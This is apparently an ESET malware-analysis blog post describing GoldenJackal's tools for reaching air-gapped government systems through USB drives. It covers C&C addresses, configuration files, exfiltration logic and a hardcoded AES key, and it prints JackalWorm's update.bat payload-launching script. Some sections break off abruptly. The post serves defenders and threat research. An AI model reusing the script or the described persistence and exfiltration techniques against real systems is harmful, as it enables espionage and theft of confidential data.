                <p><b>ESET Research analyzed two separate toolsets for breaching air-gapped systems, used by a cyberespionage threat actor known as GoldenJackal</b></p>     <p>ESET researchers discovered a series of attacks on a governmental organization in Europe using tools capable of targeting air-gapped systems. The campaign, which we attribute to GoldenJackal, a cyberespionage APT group that targets government and diplomatic entities, took place from May 2022 to March 2024. By analyzing the toolset deployed by the group, we were able to identify an attack GoldenJackal carried out earlier, in 2019, against a South Asian embassy in Belarus that, yet again, targeted the embassy&rsquo;s air-gapped systems with custom tools.</p> <p>This blogpost introduces previously undocumented tools that we attribute to GoldenJackal based on victimology, code, and functional similarities between the toolsets.</p> <blockquote> <div><strong>Key points of the blogpost:</strong></div> <ul> <li>GoldenJackal used a custom toolset to target air-gapped systems at a South Asian embassy in Belarus since at least August 2019. In this blogpost, we describe these tools publicly for the first time.</li> <li>This blogpost also features the first public description of a highly modular toolset GoldenJackal deployed on various occasions between May 2022 and March 2024 against a national government organization of a country in the European Union.</li> <li>These toolsets provide GoldenJackal a wide set of capabilities for compromising and persisting in targeted networks. Victimized systems are abused to collect interesting information, process the information, exfiltrate files, and distribute files, configurations and commands to other systems.</li> <li>The ultimate goal of GoldenJackal seems to be stealing confidential information, especially from high-profile machines that might not be connected to the internet.</li> </ul> </blockquote> <h2>GoldenJackal profile</h2> <p>GoldenJackal is an APT group active since at least 2019. It targets government and diplomatic entities in Europe, the Middle East, and South Asia. The group is little known and has only been publicly described in 2023 by <a href="https://securelist.com/goldenjackal-apt-group/109677/" target="_blank" rel="noopener">Kaspersky</a>. The group&rsquo;s known toolset includes several implants written in C#: JackalControl, JackalSteal, JackalWorm, JackalPerInfo, and JackalScreenWatcher &ndash; all of them used for espionage.</p> <h2>Overview</h2> <p>In May 2022, we discovered a toolset that we could not attribute to any APT group. But once the attackers used a tool similar to one of those publicly documented by Kaspersky, we were able to dig deeper and to find a connection between the publicly documented toolset of GoldenJackal and this new one.</p> <p>Extrapolating from that, we managed to identify an earlier attack where the publicly documented toolset was deployed, as well as an older toolset that also has capabilities to target air-gapped systems. This blogpost shines a light on the technical aspects of the publicly undocumented toolsets, and shares some insights about GoldenJackal&rsquo;s tactics, techniques, and procedures.</p> <h3>Victimology</h3> <p>GoldenJackal has been targeting governmental entities in Europe, the Middle East, and South Asia. We detected GoldenJackal tools at a South Asian embassy in Belarus in August and September 2019, and again in July 2021.</p> <p><a href="https://securelist.com/goldenjackal-apt-group/109677/#victims" target="_blank" rel="noopener">Kaspersky reported</a> a limited number of attacks against government and diplomatic entities in the Middle East and South Asia, starting in 2020.</p> <p>More recently, according to ESET telemetry, a national government organization of a country in the European Union was repeatedly targeted from May 2022 until March 2024.</p> <h3>Attribution</h3> <p>All the campaigns that we describe in this blogpost deployed, at some point, at least one of the tools attributed to the GoldenJackal APT group <a href="https://securelist.com/goldenjackal-apt-group/109677/" target="_blank" rel="noopener">by Kaspersky</a>. As was the case in the Kaspersky report, we can&rsquo;t attribute GoldenJackal&rsquo;s activities to any specific nation-state. There is, however, one clue that might point towards the origin of the attacks: in the GoldenHowl malware, the C&amp;C protocol is referred to as <span style="font-family: courier new, courier, monospace;">transport_http</span>, which is an expression typically used by Turla (see our <a href="https://web-assets.esetstatic.com/wls/2020/05/ESET_Turla_ComRAT.pdf" target="_blank" rel="noopener">ComRat v4 report</a>) and <a href="https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/" target="_blank" rel="noopener">MoustachedBouncer</a>. This may indicate that the developers of GoldenHowl are Russian speakers.</p> <h3><a name="_Toc178267626"></a>Breaching air-gapped systems</h3> <p>In order to minimize the risk of compromise, highly sensitive networks are often air gapped, i.e., isolated from other networks. Usually, organizations will air gap their most valuable systems, such as voting systems and industrial control systems running power grids. These are often precisely the networks that are of most interest to attackers.</p> <p>As we stated in a previous white paper titled <a href="https://web-assets.esetstatic.com/wls/2021/12/eset_jumping_the_air_gap_wp.pdf" target="_blank" rel="noopener">Jumping the air gap: 15 years of nation-state effort</a>, compromising an air-gapped network is much more resource-intensive than breaching an internet-connected system, which means that frameworks designed to attack air-gapped networks have so far been exclusively developed by APT groups. The purpose of such attacks is always espionage, perhaps with <a href="https://web-assets.esetstatic.com/wls/2012/11/Stuxnet_Under_the_Microscope.pdf" target="_blank" rel="noopener">a side of sabotage</a>.</p> <p>With the level of sophistication required, it is quite unusual that in five years, GoldenJackal managed to build and deploy not one, but two separate toolsets designed to compromise air-gapped systems. This speaks to the resourcefulness of the group. The attacks against a South Asian embassy in Belarus made use of custom tools that we have only seen in that specific instance. The campaign used three main components: GoldenDealer to deliver executables to the air-gapped system via USB monitoring; GoldenHowl, a modular backdoor with various functionalities; and GoldenRobo, a file collector and exfiltrator.</p> <p>In the latest series of attacks against a government organization in Europe, GoldenJackal moved on from the original toolset to a new, highly modular one. This modular approach applied not only to the design of the malicious tools (as was the case with GoldenHowl), but also to their roles: they were used, among other things, to collect and process interesting information, to distribute files, configurations, and commands to other systems, and to exfiltrate files.</p> <h2>Technical analysis</h2> <h3>Initial access</h3> <p>So far, we haven&rsquo;t been able to trace back to the initial compromise vector in the campaigns seen in our telemetry. Note that Kaspersky reported in a <a href="https://securelist.com/goldenjackal-apt-group/109677/" target="_blank" rel="noopener">blogpost</a> that GoldenJackal used trojanized software and malicious documents for this purpose.</p> <h3>The mysterious toolset from 2019</h3> <p>The earliest attack that we have attributed to GoldenJackal, which targeted a South Asian embassy in Belarus, occurred in August 2019. The toolset used in this attack is, to the best of our knowledge, publicly undocumented. We&rsquo;ve only observed the following custom tools once, and never again:</p> <ul> <li>A malicious component that can deliver executables to air-gapped systems via USB drives. We&rsquo;ve named this component GoldenDealer.</li> <li>A backdoor, which we&rsquo;ve named GoldenHowl, with various modules for malicious capabilities.</li> <li>A malicious file collector and exfiltrator, which we&rsquo;ve named GoldenRobo.</li> </ul> <p>An overview of the attack is shown in Figure 1. The initial attack vector is unknown, so we assume that GoldenDealer and an unknown worm component are already present on a compromised PC that has access to the internet. Whenever a USB drive is inserted, the unknown component copies itself and the GoldenDealer component to the drive. While we didn&rsquo;t observe this unknown component, we have seen components with similar purposes &ndash; such as <a href="https://securelist.com/goldenjackal-apt-group/109677/#jackalworm" target="_blank" rel="noopener">JackalWorm</a> &ndash; in other toolsets used in later attacks performed by the group.</p> <figure><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-1.png" alt="" width="1327" height="2000" /> <figcaption><em>Figure 1. Overview of the initial compromise of an air-gapped system</em></figcaption> </figure> <p>It is probable that this unknown component finds the last modified directory on the USB drive, hides it, and renames itself with the name of this directory, which is done by JackalWorm. We also believe that the component uses a folder icon, to entice the user to run it when the USB drive is inserted in an air-gapped system, which again is done by JackalWorm.</p> <p>When the drive is again inserted into the internet-connected PC, GoldenDealer takes the information about the air-gapped PC from the USB drive and sends it to the C&amp;C server. The server replies with one or more executables to be run on the air-gapped PC. Finally, when the drive is again inserted into the air-gapped PC, GoldenDealer takes the executables from the drive and runs them. Note that this time no user interaction is needed, because GoldenDealer is already running.</p> <p>We have observed GoldenDealer running GoldenHowl on an internet-connected PC. While we didn&rsquo;t observe GoldenDealer directly executing GoldenRobo, we observed the latter also running on the connected PC, used to take files from the USB drive and exfiltrate them to its C&amp;C server. There must be yet another unknown component that copies files from the air-gapped PC to the USB drive, but we haven&rsquo;t observed it yet.</p> <h4>GoldenDealer</h4> <p>This component monitors the insertion of removable drives on both air-gapped and connected PCs, as well as internet connectivity. Based on the latter, it can download executable files from a C&amp;C server and hide them on removable drives, or retrieve them from these drives and execute them on systems that have no connectivity.</p> <p>The program can be run with or without arguments. When run with arguments, it takes a path to a file that it moves to a new location and then runs via the <span style="font-family: courier new, courier, monospace;">CreateProcessW</span> API without creating a window.</p> <p>To prevent hidden files being shown in Windows Explorer, GoldenDealer creates the <span style="font-family: courier new, courier, monospace;">ShowSuperHidden</span> value in the <span style="font-family: courier new, courier, monospace;">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced</span> registry key, and sets it to zero.</p> <p>In case GoldenDealer is not running as a service, it creates and starts a service called <span style="font-family: courier new, courier, monospace;">NetDnsActivatorSharing</span>, then exits. If for any reason the service couldn&rsquo;t be created, persistence is achieved by creating an entry in a <span style="font-family: courier new, courier, monospace;">Run</span> registry key.</p> <p>Table 1 shows the list of configuration files used by GoldenDealer. These are located in the directory from which the malware is running: <span style="font-family: courier new, courier, monospace;">C:\Windows\TAPI</span> in the observed attack. More details about these files is provided in subsequent sections.</p> <blockquote style="padding: 5px; margin: 5px 0;"> <p style="text-align: center; font-size: 0.9em; margin-bottom: 0;">Table 1.

XOR encryption is performed one byte at a time, with a single-byte key that is incremented based on a multiplier.</p> <h5>Network connectivity thread</h5> <p>In order to determine whether a PC is connected to the internet, GoldenDealer sends a GET request to <span style="font-family: courier new, courier, monospace;">https://1.1.1.1/&lt;user_id&gt;</span> every 15 minutes. If the connection fails, or there&rsquo;s no reply, the PC is assumed to be offline. <span style="font-family: courier new, courier, monospace;">1.1.1.1</span> maps to Cloudflare&rsquo;s DNS resolver, and the expected behavior is to receive a <span style="font-family: courier new, courier, monospace; white-space: nowrap;">Not Found</span> document and a <span style="font-family: courier new, courier, monospace;">404</span> status code. The <span style="font-family: courier new, courier, monospace;">&lt;user_id&gt;</span> part is not relevant here, but is used for C&amp;C communication. GoldenDealer generates this user identifier based on:</p> <ul> <li>The current username as found via the <span style="font-family: courier new, courier, monospace;">GetUserNameW</span> API.</li> <li>The serial number of the first available logical drive in the system. This does not necessarily mean the drive where the OS is installed.</li> </ul> <p>These two strings are separately hashed with the <a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function" target="_blank" rel="noopener">FNV-1a</a> function, and the resulting numbers are XORed together, obtaining a number that identifies the user.</p> <p>To keep track of network connectivity status, GoldenDealer uses a global variable that can hold any of the following values:</p> <ul> <li><span style="font-family: courier new, courier, monospace;">0</span> &ndash; Malware started running and connectivity has not been checked.</li> <li><span style="font-family: courier new, courier, monospace;">1</span> &ndash; PC doesn&rsquo;t have internet connectivity.</li> <li><span style="font-family: courier new, courier, monospace;">2</span> &ndash; PC has internet connectivity.</li> </ul> <p>If the status is <span style="font-family: courier new, courier, monospace;">2</span>, a thread is signaled to download executable files from the C&amp;C server, and another thread is signaled to copy the executables to USB drives. A thread to get executables from drives and run them will only be signaled when the status is <span style="font-family: courier new, courier, monospace;">1</span>. Whenever the status changes, the configuration file <span style="font-family: courier new, courier, monospace;">b8b9-de4d-3b06-9d44</span> is updated with the new value. Fields in this file are:</p> <ul> <li><span style="font-family: courier new, courier, monospace;">wmk</span> &ndash; network connectivity status.</li> <li><span style="font-family: courier new, courier, monospace;">qotwnk</span> &ndash; number of seconds without internet. This value is incremented every 15 minutes and reset to zero when there&rsquo;s connectivity. It can be used if the malware is configured to wait a minimum number of seconds before deciding that the PC has no connectivity, but there was no wait in the samples that we observed.</li> <li><span style="font-family: courier new, courier, monospace;">ltwnk</span> &ndash; unknown. This field is not used by the malware.</li> <li><span style="font-family: courier new, courier, monospace;">rpk</span> &ndash; list with hashes of executables downloaded from the C&amp;C server.</li> </ul> <h5><a name="_User_identifier"></a>Downloader thread</h5> <p>This thread checks the network connectivity status every 30 minutes, and only performs the following actions if the PC is connected to the internet. First, a GET request is sent to <span style="font-family: courier new, courier, monospace;">https://83.24.9[.]124/&lt;user_id&gt;</span>, just to let the C&amp;C server know that another request is to follow. The reply from the server is not processed. If the request fails, then another request is sent to a secondary server, <span style="font-family: courier new, courier, monospace;">http://196.29.32[.]210/&lt;user_id&gt;</span>, probably to notify about failure, as the thread doesn&rsquo;t continue to execute in this case. The URLs are hardcoded in the malware and are not configurable in the samples that we observed.</p> <p>When communication is successful, GoldenDealer sends a request to <span style="font-family: courier new, courier, monospace;">https://83.24.9[.]124/&lt;user_id&gt;/fc93-10f4-2a68-d548</span>. The server replies with an array of JSON objects with the following fields:</p> <ul> <li><span style="font-family: courier new, courier, monospace;">ek</span> &ndash; a base64-encoded string that is an executable file after being decoded,</li> <li><span style="font-family: courier new, courier, monospace;">tpik</span> &ndash; an array of <span style="font-family: courier new, courier, monospace;">user_ids</span> used to decide whether the executable will be run,</li> <li><span style="font-family: courier new, courier, monospace;">hek</span> &ndash; the FNV-1a hash of <span style="font-family: courier new, courier, monospace;">ek</span>, and</li> <li><span style="font-family: courier new, courier, monospace;">apk</span> &ndash; date and time when the executable was obtained from the C&amp;C server.</li> </ul> <p>The contents of the last two fields are not relevant, because they are calculated by the downloader thread, replacing original data sent by the C&amp;C server. In both cases, they are stored as decimal numbers.</p> <p>GoldenDealer will run an executable sent by the server if the corresponding <span style="font-family: courier new, courier, monospace;">user_id</span> is in the <span style="font-family: courier new, courier, monospace;">tpik</span> list, and the <span style="font-family: courier new, courier, monospace;">hek</span> hash is not in the list of hashes stored in the <span style="font-family: courier new, courier, monospace;">rpk</span> field in the configuration. In other words, connected PCs can download executables and pass them along to other systems via USB drives, but they can also run received executables. When an executable is run, its hash is added to the <span style="font-family: courier new, courier, monospace;">rpk</span> list, ensuring that it will only be executed once by that victim. Each executable is written in the working directory with the value of <span style="font-family: courier new, courier, monospace;">&lt;hek&gt;</span> as its filename. All JSON objects with received executables are stored on disk, in the file <span style="font-family: courier new, courier, monospace;">fb43-138c-2eb0-c651</span>.</p> <p>As the final step, the downloader thread collects information about the compromised system and sends it to <span style="font-family: courier new, courier, monospace;">https://83.24.9[.]124/&lt;user_id&gt;/a1e7-4228-df20-1600</span>. The configuration file <span style="font-family: courier new, courier, monospace;">130d-1154-30ce-be1e</span> is updated to store this information as well. Figure 2 shows part of the JSON object with the information sent to the C&amp;C server. While all strings are sent as arrays of decimal character codes, for readability we show them as strings in the image. For example, instead of <span style="font-family: courier new, courier, monospace;">lsass.exe</span>, the value <span style="font-family: courier new, courier, monospace;">[108, 115, 97, 115, 115, 46, 101, 120, 101]</span> is actually sent.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-2.png" alt="" width="934" height="909" /> <figcaption><em>Figure 2. Part of the information sent by the downloader thread to the C&amp;C server</em></figcaption> </figure> <p>The members are:</p> <ul> <li><span style="font-family: courier new, courier, monospace;">iepk</span> &ndash; a Boolean value that indicates whether the GoldenDealer process is elevated,</li> <li><span style="font-family: courier new, courier, monospace;">pclk</span> &ndash; an array of running processes,</li> <li><span style="font-family: courier new, courier, monospace;">pglk</span> &ndash; an array of installed programs in both <span style="font-family: courier new, courier, monospace;">Program Files</span> and <span style="font-family: courier new, courier, monospace;">Program Files (x86)</span> directories,</li> <li><span style="font-family: courier new, courier, monospace;">pik</span> &ndash; the <span style="font-family: courier new, courier, monospace;">user_id</span>,</li> <li><span style="font-family: courier new, courier, monospace;">sik</span> &ndash; information about the operating system (including version, build, service pack number; architecture; and Boolean values indicating whether the OS is running on a server, domain controller, or workstation),</li> <li><span style="font-family: courier new, courier, monospace;">uck</span> &ndash; the user who is running the GoldenDealer process, and</li> <li><span style="font-family: courier new, courier, monospace;">ulk</span> &ndash; an array of all users, each with a Boolean value indicating whether the user has administrator privileges.</li> </ul> <h5>USB monitoring thread on connected PCs</h5> <p>GoldenDealer monitors the insertion of removable drives by creating a window titled <span style="font-family: courier new, courier, monospace;">defaultWindow</span> with a custom event handler that processes inserted devices and ignores all other system events.</p> <p>Once a USB drive has been inserted, this thread patches one byte in the master boot record (MBR) of that drive: it searches for the offset where the <span style="font-family: courier new, courier, monospace;">BOOTMGR</span> string resides, and replaces the first <span style="font-family: courier new, courier, monospace;">O</span> with <span style="font-family: courier new, courier, monospace;">0</span>. Then it checks whether the second <span style="font-family: courier new, courier, monospace;">O</span> has also been patched to <span style="font-family: courier new, courier, monospace;">0</span>, and exits if it hasn&rsquo;t. The USB thread that runs on air-gapped PCs does the opposite: it patches the second <span style="font-family: courier new, courier, monospace;">O</span>, and checks whether the first has already been patched. This means that the USB drive needs to have been inserted in both a connected PC and an air-gapped PC for the drive to be processed.</p> <p>If the check is successful, a hidden directory is created on the USB drive, with two files written inside:</p> <ul> <li><span style="font-family: courier new, courier, monospace;">37b3-ebe5-568e-0676</span> &ndash; this file has the same contents as <span style="font-family: courier new, courier, monospace;">fb43-138c-2eb0-c651</span> (all the executables sent by the C&amp;C server). It&rsquo;s used to pass the executables to air-gapped systems, for execution.</li> <li><span style="font-family: courier new, courier, monospace;">bc41-ac6f-e55e-61a8</span> &ndash; a file with information from air-gapped PCs. It&rsquo;s created empty by this thread, then populated by the USB thread running on air-gapped PCs. The contents of this file are appended to the local file <span style="font-family: courier new, courier, monospace;">130d-1154-30ce-be1e</span> (see Table 1), to be sent to the C&amp;C server by the downloader thread.</li> </ul> <h5>USB monitoring thread on air-gapped PCs</h5> <p>This is complementary to the thread described in the previous section: it takes the file <span style="font-family: courier new, courier, monospace; white-space: nowrap;">37b3-ebe5-568e-0676</span> with executables on the USB drive and copies its contents to the local file <span style="font-family: courier new, courier, monospace; white-space: nowrap;">fb43-138c-2eb0-c651</span>. It also takes the local file <span style="font-family: courier new, courier, monospace;">130d-1154-30ce-be1e</span> with information about the air-gapped system and adds its contents to the <span style="font-family: courier new, courier, monospace;">bc41-ac6f-e55e-61a8</span> file on the USB drive. The code to obtain system information and to run executables is contained in this thread.</p> <h4>GoldenHowl</h4> <p>Another tool from GoldenJackal&rsquo;s 2019 toolset is GoldenHowl, a backdoor written in Python that consists of various modules for malicious functionalities.

The last part of the URL is <span style="font-family: courier new, courier, monospace;">8102</span>, which is the same as the <span style="font-family: courier new, courier, monospace;">client_id</span> field in GoldenHowl&rsquo;s configuration. This URL is hardcoded in GoldenRobo, which tells us that the attackers compiled this version of GoldenRobo for this victim exclusively.</p> <h3>The known toolset: Previously documented by Kaspersky</h3> <p>A few weeks after deploying the previous toolset, GoldenJackal started to use other malicious tools on the same compromised computers. In September 2019, we observed the execution of PowerShell scripts to download the <a href="https://securelist.com/goldenjackal-apt-group/109677/#jackalcontrol" target="_blank" rel="noopener">JackalControl</a> backdoor. This backdoor was used to execute other PowerShell scripts, to download and run legitimate tools such as <a href="https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html" target="_blank" rel="noopener">Plink</a> and <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">PsExec</a>.</p> <p>In various attacks, between September 2019 and January 2024, we observed the following tools in GoldenJackal&rsquo;s arsenal:</p> <ul> <li>JackalControl,</li> <li>JackalSteal, a file collector and exfiltrator, and</li> <li>JackalWorm, used to propagate other malicious components via USB drives. We observed it propagating the JackalControl backdoor.</li> </ul> <p>As these components have already been documented by <a href="https://securelist.com/goldenjackal-apt-group/109677/">Kaspersky</a>, we will not describe them in this blogpost. However, one interesting point to mention is that in early versions of these tools, URLs for C&amp;C servers were hardcoded in the malware binaries. At some point, GoldenJackal modified JackalControl and JackalSteal to receive C&amp;C servers as arguments.</p> <h3>The latest toolset: Keeping a foothold in the network</h3> <p>In May 2022, we observed GoldenJackal using a new toolset while targeting a governmental organization in Europe. Most of these tools are written in Go and provide diverse capabilities, such as collecting files from USB drives, spreading payloads in the network via USB drives, exfiltrating files, and using some PCs in the network as servers to deliver diverse files to other systems. In addition, we have seen the attackers using <a href="https://github.com/fortra/impacket">Impacket</a> to move laterally across the network.</p> <p>In the observed attacks, GoldenJackal started to use a highly modular approach, using various components to perform different tasks. Some hosts were abused to exfiltrate files, others were used as local servers to receive and distribute staged files or configuration files, and others were deemed interesting for file collection, for espionage purposes. Figure 5 shows a classification of the components that are described over the next sections.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-5.png" alt="" width="1500" height="1500" /> <figcaption><em>Figure 5. Components in GoldenJackal&rsquo;s latest toolset</em></figcaption> </figure> <p>Regarding network infrastructure, we didn&rsquo;t observe any external IP addresses in any of the analyzed components. File exfiltrators use publicly available services such as Google Drive or Outlook SMTP servers.</p> <h4>GoldenUsbCopy</h4> <p>GoldenUsbCopy, which we classify as a collection component, monitors the insertion of USB drives, and copies interesting files to an encrypted container that is stored on disk, to be exfiltrated by other components. According to strings found in the binary, the main package for the application is named <span style="font-family: courier new, courier, monospace;">UsbCopy</span>.</p> <p>Newly inserted drives are detected by creating a window with name <span style="font-family: courier new, courier, monospace;">WindowsUpdateManager</span>, to receive system events and process them with a custom handler. If the handler receives a <span style="font-family: courier new, courier, monospace;">WM_DEVICECHANGE</span> message, with an event type <span style="font-family: courier new, courier, monospace;">DBT_DEVICEARRIVAL</span>, and the device type is <span style="font-family: courier new, courier, monospace;">DBT_DEVTYP_VOLUME</span>, this means a new drive is ready to be processed. Figure 6 shows a side-by-side comparison between decompiled code in GoldenUsbCopy and GoldenDealer. Even though each was written in a different programming language, we can see that the code retrieves the letter of the drive to process in the same manner.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-6.png" alt="" width="1628" height="655" /> <figcaption><em>Figure 6. Code comparison between GoldenUsbCopy and GoldenDealer</em></figcaption> </figure> <p>GoldenUsbCopy determines which files to process from a USB drive based on a configuration that is stored AES encrypted in CFB mode in the file <span style="font-family: courier new, courier, monospace;">reports.ini</span>. The 32-byte key to decrypt the configuration is hardcoded in the malware. After decryption, the configuration contains the following fields, in JSON format:</p> <ul> <li><span style="font-family: courier new, courier, monospace;">outputCipherFilename</span> &ndash; full path to an encrypted archive that acts as a container for other files, such as files that contain listings of filenames from newly inserted drives, and files to be exfiltrated,</li> <li><span style="font-family: courier new, courier, monospace;">RSAKey</span> &ndash; a public key to encrypt AES keys that are used to encrypt files to be exfiltrated,</li> <li><span style="font-family: courier new, courier, monospace;">lastDate</span> &ndash; files that were last modified more than <span style="font-family: courier new, courier, monospace;">lastDate</span> days ago are not processed,</li> <li><span style="font-family: courier new, courier, monospace;">registryKey</span> &ndash; a key in <span style="font-family: courier new, courier, monospace;">HKEY_CURRENT_USER</span> that will store SHA-256 hashes of files already processed for exfiltration,</li> <li><span style="font-family: courier new, courier, monospace;">registryValue</span> &ndash; the registry value that stores the list of hashes,</li> <li><span style="font-family: courier new, courier, monospace;">maxZIPSize</span> &ndash; the maximum size in bytes for <span style="font-family: courier new, courier, monospace;">outputCipherFilename</span> (more details below),</li> <li><span style="font-family: courier new, courier, monospace;">maxFileSize</span> &ndash; files larger than <span style="font-family: courier new, courier, monospace;">maxFileSize</span>, in bytes, are not exfiltrated, and</li> <li><span style="font-family: courier new, courier, monospace;">extensionsFile</span> &ndash; a list of file extensions for exfiltration (we observed <span style="font-family: courier new, courier, monospace;">.docx</span>, <span style="font-family: courier new, courier, monospace;">.pdf</span>, <span style="font-family: courier new, courier, monospace;">.doc</span>, and <span style="font-family: courier new, courier, monospace;">.odt</span>).</li> </ul> <p>Once the configuration is decrypted, GoldenUsbCopy waits for a USB drive to be inserted. A listing of all files on the inserted drive is written to a text file, which is then archived in a ZIP file, encrypted with AES, and added to <span style="font-family: courier new, courier, monospace;">outputCipherFilename</span>. Only the encrypted container is written to disk; intermediate steps, involving text files and archives, are kept in memory.</p> <p>A similar procedure is done for files on the drive that meet the criteria for exfiltration: these files are archived together preserving their directory structure, encrypted with AES, and added to <span style="font-family: courier new, courier, monospace;">outputCipherFilename</span>. When selecting files for exfiltration, a list with SHA-256 hashes is retrieved from the registry. If the hash of a file is in that list, the file is not exfiltrated. If the hash isn&rsquo;t in the list, it is added, so that the file won&rsquo;t be exfiltrated again.</p> <p>Whenever adding files to exfiltrate would exceed the <span style="font-family: courier new, courier, monospace;">maxZIPSize</span> of <span style="font-family: courier new, courier, monospace;">outputCipherFilename</span>, the excess files are not added to the archive for exfiltration, but their paths are added to a text file that is archived, encrypted, and added to <span style="font-family: courier new, courier, monospace;">outputCipherFilename</span>.</p> <p>Regarding encryption, each individual archive that is added to the encrypted container is encrypted with AES in CFB mode, with a key and an initialization vector (IV) that are randomly generated on the spot. Both the key and IV need to be stored, but only the key is encrypted with <span style="font-family: courier new, courier, monospace;">RSAKey</span>. Figure 7 shows an example of how these fields are stored in the encrypted container.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-7.png" alt="" width="2122" height="644" /> <figcaption><em>Figure 7. Structure of the encrypted container</em></figcaption> </figure> <h4>GoldenUsbGo</h4> <p>This component is very similar to GoldenUsbCopy and seems to be a later version of it, based on when we observed them in our telemetry and comparing Go versions used to compile them. However, GoldenUsbGo achieves the same functionality with a simpler implementation:</p> <ul> <li>There is no configuration file. All criteria for file selection are hardcoded in the malware: <ul> <li>if filename contains a specific word from a list, process the file regardless of all other criteria (the list contains strings such as <span style="font-family: courier new, courier, monospace;">pass</span>, <span style="font-family: courier new, courier, monospace;">login</span>, and <span style="font-family: courier new, courier, monospace;">key</span>),</li> <li>else, file size must be no bigger than 20 MB,</li> <li>the date the file was last modified must be no more than 14 days ago, and</li> <li>the file extension must be one of <span style="font-family: courier new, courier, monospace;">.pdf</span>, <span style="font-family: courier new, courier, monospace;">.doc</span>, <span style="font-family: courier new, courier, monospace;">.docx</span>, <span style="font-family: courier new, courier, monospace;">.sh</span>, or <span style="font-family: courier new, courier, monospace;">.bat</span>.</li> </ul> </li> <li>Insertion of removable drives is not continuously monitored. A hardcoded list of drive letters is checked periodically to determine if they have an assigned volume of <span style="font-family: courier new, courier, monospace;">D:</span>, <span style="font-family: courier new, courier, monospace;">E:</span>, <span style="font-family: courier new, courier, monospace;">F:</span>, <span style="font-family: courier new, courier, monospace;">G:</span>, or <span style="font-family: courier new, courier, monospace;">H:</span>.</li> <li>The list of hashes of files that were already processed is kept in memory only.</li> <li>There is no size limit for the encrypted container where files are staged for exfiltration.</li> <li>Files are not archived but instead are compressed with gzip. Both file contents and filenames are compressed. Figure 8 shows how compressed data is arranged before encryption.</li> </ul> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-8.png" alt="" width="2537" height="307" /> <figcaption><em>Figure 8. Fields used for gzip-compressed files, before encryption</em></figcaption> </figure> <p>The path to the encrypted container is hardcoded in the malware:</p> <p><span style="font-family: courier new, courier, monospace;">C:\Users\[redacted]\appdata\local\SquirrelTemp\SquirrelCache.dat</span></p> <p>The hardcoded username in the path, redacted above, along with the short list of drives and specific filenames to process, tell us that GoldenUsbGo was compiled and tailored for this particular victim.</p> <p>Compressed files are encrypted with AES in CFB mode with the hardcoded key <span style="font-family: courier new, courier, monospace; white-space: nowrap;">Fn$@-fR_*+!13bN5</span>. The structure is the same as in GoldenUsbCopy (shown in Figure 7) but without the AES key. After compressing the files, GoldenUsbGo generates a listing of all files on the inserted drive and adds it to the encrypted container, in the same manner as exfiltrated files. The filename for the listing is formed from the current date and time, replacing <span style="font-family: courier new, courier, monospace; white-space: nowrap;">:</span> with <span style="font-family: courier new, courier, monospace; white-space: nowrap;">-</span> (for example, <span style="font-family: courier new, courier, monospace; white-space: nowrap;">15 Jan 24 13-21 PST</span>).</p> <h4>GoldenAce</h4> <p>This component, which we classified as a distribution tool in Figure 5, serves to propagate other malicious executables and retrieve staged files via USB drives. While it could be used to target air-gapped systems, it&rsquo;s not specifically built for that, as opposed to GoldenDealer. It works together with a lightweight version of <a href="https://securelist.com/goldenjackal-apt-group/109677/#jackalworm">JackalWorm</a> and some other unknown component.</p> <p>GoldenAce periodically checks drives in the list <span style="font-family: courier new, courier, monospace;">G:</span>, <span style="font-family: courier new, courier, monospace;">H:</span>, <span style="font-family: courier new, courier, monospace;">I:</span>, <span style="font-family: courier new, courier, monospace;">J:</span>, <span style="font-family: courier new, courier, monospace;">K:</span>, <span style="font-family: courier new, courier, monospace;">L:</span>, <span style="font-family: courier new, courier, monospace;">M:</span>, <span style="font-family: courier new, courier, monospace;">N:</span>, <span style="font-family: courier new, courier, monospace;">P:</span>, <span style="font-family: courier new, courier, monospace;">X:</span>, <span style="font-family: courier new, courier, monospace;">Y:</span>, and <span style="font-family: courier new, courier, monospace;">Z:</span>, to find one that is mapped to a volume. Then it checks whether a trash directory exists in the root of that drive. If it doesn&rsquo;t exist, it is created as hidden, and a file called update is copied to that directory, from the same location where GoldenAce is running. The first directory on the drive (in alphabetical order) that is not hidden is set to hidden, and a file called <span style="font-family: courier new, courier, monospace;">upgrade</span> is copied to the root of the drive and renamed as <span style="font-family: courier new, courier, monospace;">&lt;name_of_hidden_directory&gt;.exe</span>.</p> <p>The file <span style="font-family: courier new, courier, monospace;">upgrade</span> is actually JackalWorm, an executable that uses a folder icon, and whose purpose is to copy and run the <span style="font-family: courier new, courier, monospace;">update</span> file on another system where the USB drive is inserted. Unlike the version of JackalWorm described by Kaspersky, this one is very limited: it doesn&rsquo;t have code to monitor drive insertions, and it cannot be configured to perform various actions. When executed from the root directory of a removable drive, it opens the hidden folder in Windows Explorer and writes a batch file to execute the payload in <span style="font-family: courier new, courier, monospace;">update</span>. Contents of this file, <span style="font-family: courier new, courier, monospace;">update.bat</span>, are shown in Figure 9.</p> <pre class="language-markup"><code>@echo off copy "&lt;drive_letter&gt;:\\trash\\update" "C:\\Users\\%username%\\AppData\\Local\\update.exe" "C:\\Users\\%username%\\AppData\\Local\\update.exe" "&lt;drive_letter&gt;:\\trash" :check1 @tasklist | findstr /i /b "update.exe" &gt;nul @if %errorlevel%==0 goto check1 @del /f /q /a h "C:\\Users\\%username%\\AppData\\Local\\update.exe" @del /f /q "C:\\Users\\&lt;username&gt;\\AppData\\Local\\update.bat"</code></pre> <blockquote style="padding: 5px; margin: 10px 0;"> <p style="text-align: center; font-size: 0.9em;">Figure 9. Contents of <span style="font-family: courier new, courier, monospace; font-style: normal;">update.bat</span></p> </blockquote> <p>We can see that <span style="font-family: courier new, courier, monospace;">update</span> is 